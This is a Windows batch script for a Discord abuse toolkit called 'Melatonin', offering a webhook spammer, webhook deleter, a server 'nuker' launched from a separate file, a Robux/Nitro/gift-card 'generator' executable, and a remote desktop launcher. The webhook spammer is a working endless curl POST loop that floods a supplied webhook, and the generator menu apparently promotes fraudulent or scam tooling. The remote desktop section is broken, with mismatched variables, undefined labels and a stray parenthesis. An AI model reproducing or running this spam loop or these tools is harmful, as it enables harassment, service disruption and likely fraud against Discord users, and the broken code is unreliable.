@echo off
:menu
setlocal enabledelayedexpansion
title Melatonin - by cursyn - .gg/r9RzKgUZZS
MODE 92,30
chcp 65001 >nul
echo 	[38;5;129m███╗   ███╗███████╗██╗      █████╗ ████████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗[0m
echo 	[38;5;128m████╗ ████║██╔════╝██║     ██╔══██╗╚══██╔══╝██╔═══██╗████╗  ██║██║████╗  ██║[0m
echo 	[38;5;127m██╔████╔██║█████╗  ██║     ███████║   ██║   ██║   ██║██╔██╗ ██║██║██╔██╗ ██║[0m
echo 	[38;5;126m██║╚██╔╝██║██╔══╝  ██║     ██╔══██║   ██║   ██║   ██║██║╚██╗██║██║██║╚██╗██║[0m
echo 	[38;5;125m██║ ╚═╝ ██║███████╗███████╗██║  ██║   ██║   ╚██████╔╝██║ ╚████║██║██║ ╚████║[0m
echo 	[38;5;124m╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝[0m
echo]
echo                     	[38;5;124m ┌───────────────────────────────────────┐[0m
echo		           	[38;5;124m │ [38;5;238m^>[0m Webhook-Fucker[0m    [38;5;124m                  │[0m
echo		           	[38;5;124m │ [38;5;238m^>[0m Melatonin Nuker[0m  [38;5;124m                   │[0m
echo		           	[38;5;124m │ [38;5;238m^>[0m Robux/Nitro/Spotify/Apple/PS4 gen  [38;5;124m │[0m
echo		          	[38;5;124m │ [38;5;238m^>[0m Remote Desktop Controller   [38;5;124m        │[0m
echo		           	[38;5;124m │ [38;5;238m^>[0m Discord Invite[0m     [38;5;124m                 │[0m
echo		          	[38;5;124m │                                       │[0m
echo		           	[38;5;124m │                [38;5;238m^>[0m exit [38;5;124m                │[0m
echo		           	[38;5;124m └───────────────────────────────────────┘[0m

set /p choice=     Enter choice →

if %choice%==1 goto webhookabuse
if %choice%==2 goto nuker
if %choice%==3 goto gen
if %choice%==4 goto rdc
if %choice%==5 goto inv

:webhookabuse
MODE 130,30
chcp 65001
color 7
for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
cls
echo		[38;5;129m██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗     █████╗ ██████╗ ██╗   ██╗███████╗███████╗██████╗[0m 
echo		[38;5;128m██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝    ██╔══██╗██╔══██╗██║   ██║██╔════╝██╔════╝██╔══██╗[0m
echo		[38;5;127m██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝     ███████║██████╔╝██║   ██║███████╗█████╗  ██████╔╝[0m
echo		[38;5;126m██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗     ██╔══██║██╔══██╗██║   ██║╚════██║██╔══╝  ██╔══██╗[0m
echo		[38;5;125m╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗    ██║  ██║██████╔╝╚██████╔╝███████║███████╗██║  ██║[0m
echo		 [38;5;124m╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝[0m
echo]
echo]
echo                     				[38;5;124m ┌───────────────────────────────────────┐[0m
echo		           				[38;5;124m │ [38;5;238m^>[0m webhook spammer[0m    [38;5;124m                 │[0m
echo		           				[38;5;124m │ [38;5;238m^>[0m webhook message sender[0m  [38;5;124m            │[0m
echo		           				[38;5;124m │ [38;5;238m^>[0m webhook remover  [38;5;124m                   │[0m
echo		          				[38;5;124m │ [38;5;238m^>[0m soon..                    [38;5;124m          │[0m
echo		           				[38;5;124m │                                       │ [0m         
echo		          				[38;5;124m │                                       │[0m
echo		           				[38;5;124m │                [38;5;238m^>[0m exit [38;5;124m                │[0m
echo		           				[38;5;124m └───────────────────────────────────────┘[0m          
echo]
echo]
set /p choice=     Enter choice →   

if "%choice%"=="1" goto webhookspam
if "%choice%"=="2" goto webhooksend
if "%choice%"=="3" goto webhookremove
if "%choice%"=="4" goto menu

:webhookspam
cls
MODE 80,50
echo 	[38;5;129m███████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗ [0m
echo 	[38;5;128m██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗[0m
echo 	[38;5;127m███████╗██████╔╝███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝[0m
echo 	[38;5;126m╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗[0m
echo 	[38;5;125m███████║██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║[0m
echo 	[38;5;124m╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝[0m
echo]
echo]                                                              
set /p message=Input message → 
set /p webhook=Input webhook URL → 
:wloop
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"%message%\"}" %webhook%
goto wloop

:webhooksend
cls
MODE 80,15
echo 	[38;5;129m███████╗███████╗███╗   ██╗██████╗ ███████╗██████╗ [0m
echo 	[38;5;128m██╔════╝██╔════╝████╗  ██║██╔══██╗██╔════╝██╔══██╗[0m
echo 	[38;5;127m███████╗█████╗  ██╔██╗ ██║██║  ██║█████╗  ██████╔╝[0m
echo 	[38;5;126m╚════██║██╔══╝  ██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗[0m
echo 	[38;5;125m███████║███████╗██║ ╚████║██████╔╝███████╗██║  ██║[0m
echo 	[38;5;124m╚══════╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝[0m
echo]
echo]                                                  
set /p message=message →  
echo]
set /p webhook=webhook URL → 
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"%message%\"}" %webhook%
cls
goto webhookabuse


:webhookremove
cls
MODE 80,10
echo 	[38;5;129m██████╗ ███████╗███╗   ███╗ ██████╗ ██╗   ██╗███████╗██████╗ [0m
echo 	[38;5;128m██╔══██╗██╔════╝████╗ ████║██╔═══██╗██║   ██║██╔════╝██╔══██╗[0m
echo 	[38;5;127m██████╔╝█████╗  ██╔████╔██║██║   ██║██║   ██║█████╗  ██████╔╝[0m
echo 	[38;5;126m██╔══██╗██╔══╝  ██║╚██╔╝██║██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗[0m
echo 	[38;5;125m██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝ ╚████╔╝ ███████╗██║  ██║[0m
echo 	[38;5;124m╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝[0m
echo]
echo]
set /p webhook_url=Enter webhook →


curl -X DELETE %webhook_url%


if %errorlevel% equ 0 (
    echo Webhook removed successfully.
) else (
    echo Failed to remove webhook try again and make sure the URL is correct.
    echo Error code: %errorlevel%
)

if %errorlevel% equ 0 (
    echo Webhook removed successfully.
) else (
    echo Failed to remove webhook try again and make sure the URL is correct.
    echo Error code: %errorlevel%
)

cls
goto webhookabuse

:nuker
cls
echo 	[38;5;129m███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ [0m
echo 	[38;5;128m████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗[0m
echo 	[38;5;127m██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝[0m
echo 	[38;5;126m██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗[0m
echo 	[38;5;125m██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║[0m
echo 	[38;5;124m╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝[0m
echo]
echo]
echo press enter to run Nuker
pause >nul
call start.bat
pause
echo press enter to go back to menu
pause >nul
goto :menu

:inv
cls
echo press enter to get redirected to our discord server [if invite doesnt work, do https://guns.lol/cursyn]
pause >nul
start https://discord.gg/REFArr8W
goto menu

:gen
cls
echo [38;5;129m██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗ [0m
echo [38;5;128m██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗[0m
echo [38;5;127m██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝[0m
echo [38;5;126m██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗[0m
echo [38;5;125m╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║[0m
echo [38;5;124m ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝[0m
echo press enter for the generator to launch.
pause >nul
"%~dp0Files\gen\generator.exe" start
echo press enter to go back to menu
pause >nul
goto :menu

:rdc
cls
echo [38;5;129m██████╗ ██████╗  ██████╗[0m
echo [38;5;128m██╔══██╗██╔══██╗██╔════╝[0m
echo [38;5;127m██████╔╝██║  ██║██║     [0m
echo [38;5;126m██╔══██╗██║  ██║██║     [0m
echo [38;5;125m██║  ██║██████╔╝╚██████╗[0m
echo [38;5;124m╚═╝  ╚═╝╚═════╝  ╚═════╝[0m
set /p host="Enter host ip: "
set /p username="Enter username: "
set /p password="Enter password: "
    cmdkey /add: %host% /user:%user% /pass:%pass%
    mstsc /v:%host%
    cmdkey /delete:%host%
    pause
    cls
    goto prmpt
)

if %input% EQU 2 (
    echo finding private ip address
    ipconfig | findstr "IPv4"
    echo found
    pause
    cls
    goto :prmpt
)

if %input% EQU 3 ( cls
    echo Your public IP address is:
    curl -s https://api.ipify.org
    echo.
    pause
    goto prmpt
)

if %input% EQU 4 ( goto menu


                                                                             

